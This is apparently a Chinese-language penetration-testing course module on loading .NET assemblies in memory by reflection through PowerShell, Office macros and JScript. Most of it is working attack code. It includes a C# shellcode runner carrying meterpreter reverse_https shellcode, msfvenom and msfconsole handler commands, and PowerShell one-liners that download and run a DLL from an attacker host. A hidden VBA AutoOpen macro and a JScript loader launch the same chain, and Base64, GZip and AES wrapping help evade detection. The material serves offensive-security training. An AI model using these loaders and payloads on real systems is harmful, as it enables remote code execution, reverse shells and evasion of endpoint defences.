# Module 4: Windows Script Host 攻击

## 第四节：反射式加载 C# 程序集

### 什么是反射式加载？

反射式加载（Reflective Loading）是一种在内存中直接加载和执行 .NET 程序集的技术，**无需将文件写入磁盘**。

```
传统加载:
下载 DLL → 保存到磁盘 → 加载执行
                ↑
           文件落地，易被检测

反射式加载:
下载 DLL → 直接在内存中加载执行
                ↑
           无文件落地，难以检测
```

---

## 一、.NET 反射基础

### 1.1 什么是反射？

反射（Reflection）是 .NET 的一个特性，允许程序在运行时：
- 检查类型信息
- 动态创建对象
- 调用方法
- 访问属性和字段

**Web 安全类比**：
- 类似于 JavaScript 中的 `eval()` 或动态属性访问
- 类似于 PHP 中的 `call_user_func()`

### 1.2 反射的基本用法

```csharp
using System;
using System.Reflection;

class Program
{
    static void Main()
    {
        // 加载程序集
        Assembly assembly = Assembly.LoadFile(@"C:\path\to\MyLibrary.dll");

        // 获取类型
        Type type = assembly.GetType("MyNamespace.MyClass");

        // 获取方法
        MethodInfo method = type.GetMethod("MyMethod");

        // 创建实例
        object instance = Activator.CreateInstance(type);

        // 调用方法
        method.Invoke(instance, new object[] { "参数1", "参数2" });
    }
}
```

## 二、PowerShell 中的反射式加载

### 2.1 从文件加载（有文件落地）

```powershell
# 下载 DLL 到磁盘
(New-Object System.Net.WebClient).DownloadFile(
    'http://192.168.1.100/ClassLibrary1.dll',
    'C:\Users\Public\ClassLibrary1.dll'
)

# 从文件加载程序集
$assembly = [System.Reflection.Assembly]::LoadFile("C:\Users\Public\ClassLibrary1.dll")

# 获取类型和方法
$type = $assembly.GetType("ClassLibrary1.Class1")
$method = $type.GetMethod("runner")

# 调用方法
$method.Invoke($null, $null)
```

### 2.2 从内存加载（无文件落地）

```powershell
# 下载 DLL 到内存（字节数组）
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.100/ClassLibrary1.dll')

# 直接从字节数组加载
$assembly = [System.Reflection.Assembly]::Load($data)

# 获取类型和方法
$type = $assembly.GetType("ClassLibrary1.Class1")
$method = $type.GetMethod("runner")

# 调用方法
$method.Invoke($null, $null)
```

**关键区别**：
- `LoadFile()` - 从磁盘文件加载
- `Load()` - 从字节数组加载（内存中）

## 三、创建可反射加载的 C# 程序集

### 3.1 Visual Studio 项目设置

1. 创建新项目：**Class Library (.NET Framework)**
2. 项目名称：`ClassLibrary1`
3. 选择 .NET Framework 4.0 或更高版本

### 3.2 Shellcode Runner 代码

```csharp
// ClassLibrary1/Class1.cs
using System;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        // 公共静态方法，供反射调用
        public static void runner()
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f csharp
            byte[] buf = new byte[630] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,
                // ... shellcode ...
            };

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

### 3.3 编译设置

1. 切换到 **Release** 模式
2. 设置平台为 **x64**（如果使用 64 位 shellcode）
3. Build → Build Solution

## 四、完整的攻击流程

### 4.1 准备阶段（Kali）

```bash
# 1. 生成 shellcode
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.1.100 LPORT=443 -f csharp -o shellcode.txt

# 2. 将 shellcode 复制到 C# 项目中，编译得到 ClassLibrary1.dll

# 3. 将 DLL 放到 Web 服务器
cp ClassLibrary1.dll /var/www/html/
sudo systemctl start apache2

# 4. 启动监听器
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.1.100; set LPORT 443; run"
```

### 4.2 执行阶段（目标机器）

```powershell
# PowerShell 一行命令
$d=(New-Object System.Net.WebClient).DownloadData('http://192.168.1.100/ClassLibrary1.dll');$a=[System.Reflection.Assembly]::Load($d);$a.GetType('ClassLibrary1.Class1').GetMethod('runner').Invoke($null,$null)
```

### 4.3 格式化版本

```powershell
# 下载 DLL 到内存
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.100/ClassLibrary1.dll')

# 加载程序集
$assembly = [System.Reflection.Assembly]::Load($data)

# 获取类和方法
$class = $assembly.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")

# 执行
$method.Invoke($null, $null)
```

## 五、结合 Office 宏

### 5.1 VBA 中调用 PowerShell

```vba
Sub Document_Open()
    AutoOpen
End Sub

Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -ep bypass -w hidden -c ""$d=(New-Object System.Net.WebClient).DownloadData('http://192.168.1.100/ClassLibrary1.dll');$a=[System.Reflection.Assembly]::Load($d);$a.GetType('ClassLibrary1.Class1').GetMethod('runner').Invoke($null,$null)"""

    CreateObject("WScript.Shell").Run cmd, 0
End Sub
```

### 5.2 注意事项

- **32 位 vs 64 位**：Office 通常是 32 位，需要使用 32 位 shellcode
- **执行策略**：使用 `-ep bypass` 绑定执行策略
- **窗口隐藏**：使用 `-w hidden` 隐藏 PowerShell 窗口

## 六、高级技术

### 6.1 Base64 编码传输

```powershell
# 编码（在 Kali 上）
$bytes = [System.IO.File]::ReadAllBytes("ClassLibrary1.dll")
$base64 = [Convert]::ToBase64String($bytes)
$base64 | Out-File encoded.txt

# 解码并加载（在目标上）
$base64 = "TVqQAAMAAAA..."  # Base64 字符串
$bytes = [Convert]::FromBase64String($base64)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$assembly.GetType('ClassLibrary1.Class1').GetMethod('runner').Invoke($null,$null)
```

### 6.2 压缩传输

```powershell
# 使用 GZip 压缩
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.100/ClassLibrary1.dll.gz')
$ms = New-Object System.IO.MemoryStream(,$data)
$gz = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
$sr = New-Object System.IO.MemoryStream
$gz.CopyTo($sr)
$bytes = $sr.ToArray()
$assembly = [System.Reflection.Assembly]::Load($bytes)
```

### 6.3 加密传输

```powershell
# AES 解密示例
function Decrypt-AES {
    param($encryptedData, $key, $iv)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv
    $decryptor = $aes.CreateDecryptor()

    $ms = New-Object System.IO.MemoryStream(,$encryptedData)
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
    $sr = New-Object System.IO.MemoryStream
    $cs.CopyTo($sr)

    return $sr.ToArray()
}

# 使用
$encrypted = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.100/encrypted.bin')
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789ABCDEF")  # 16 字节密钥
$iv = [System.Text.Encoding]::UTF8.GetBytes("ABCDEF0123456789")   # 16 字节 IV
$decrypted = Decrypt-AES $encrypted $key $iv
$assembly = [System.Reflection.Assembly]::Load($decrypted)
```

## 七、与 Jscript 结合

### 7.1 Jscript 调用 PowerShell 反射加载

```javascript
// reflective_loader.js
var shell = new ActiveXObject("WScript.Shell");

var cmd = 'powershell -ep bypass -w hidden -c "' +
    '$d=(New-Object System.Net.WebClient).DownloadData(\'http://192.168.1.100/ClassLibrary1.dll\');' +
    '$a=[System.Reflection.Assembly]::Load($d);' +
    '$a.GetType(\'ClassLibrary1.Class1\').GetMethod(\'runner\').Invoke($null,$null)"';

shell.Run(cmd, 0, false);
```

### 7.2 对比：DotNetToJscript vs 反射加载

| 特性 | DotNetToJscript | PowerShell 反射加载 |
|------|-----------------|-------------------|
| 依赖 | 无需 PowerShell | 需要 PowerShell |
| 检测 | 较难检测 | 可能触发 AMSI |
| 灵活性 | 需要重新生成 | 可动态更新 payload |
| 大小 | 较大（嵌入程序集） | 较小（远程加载） |
